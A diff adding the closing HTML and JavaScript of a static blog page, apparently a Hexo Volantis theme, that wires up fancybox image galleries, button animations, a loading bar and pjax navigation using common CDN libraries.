+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
